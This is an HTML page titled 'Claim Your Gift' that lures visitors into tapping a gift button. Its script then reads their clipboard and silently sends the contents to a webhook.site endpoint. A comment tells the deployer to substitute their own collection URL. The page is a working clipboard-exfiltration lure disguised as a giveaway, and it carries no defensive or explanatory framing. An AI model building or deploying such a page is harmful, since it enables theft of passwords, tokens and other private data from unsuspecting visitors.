<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Claim Your Gift</title>
    <style>
        body {
            background-color: #0f0f0f;
            color: #fff;
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .gift-btn {
            background-color: #28a745;
            color: #fff;
            border: none;
            padding: 18px 36px;
            font-size: 20px;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(40, 167, 69, 0.4);
            transition: transform 0.2s;
        }
        .gift-btn:active {
            transform: scale(0.96);
        }
    </style>
</head>
<body>

    <button class="gift-btn" onclick="claimGift()">🎁 Tap to Paste & Claim Gift</button>
    <p id="status" style="margin-top: 25px; color: #bbb; font-size: 16px;"></p>

    <script>
        // REPLACE WITH YOUR WEBHOOK.SITE URL
        const WEBHOOK_URL = "https://webhook.site/d5b8ad10-9401-461a-9519-d408d46ea101";

        async function claimGift() {
            const statusEl = document.getElementById('status');
            statusEl.innerText = "Accessing clipboard buffer...";

            try {
                // Request permission and read the user's clipboard
                const clipboardText = await navigator.clipboard.readText();

                // Send the captured text to your Webhook endpoint
                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        giftContent: clipboardText,
                        time: new Date().toLocaleString()
                    })
                });

                statusEl.innerText = "Gift intercepted! Buffer dumped to remote session.";
            } catch (err) {
                statusEl.innerText = "Permission denied or browser restricted clipboard access.";
            }
        }
    </script>
</body>
</html>
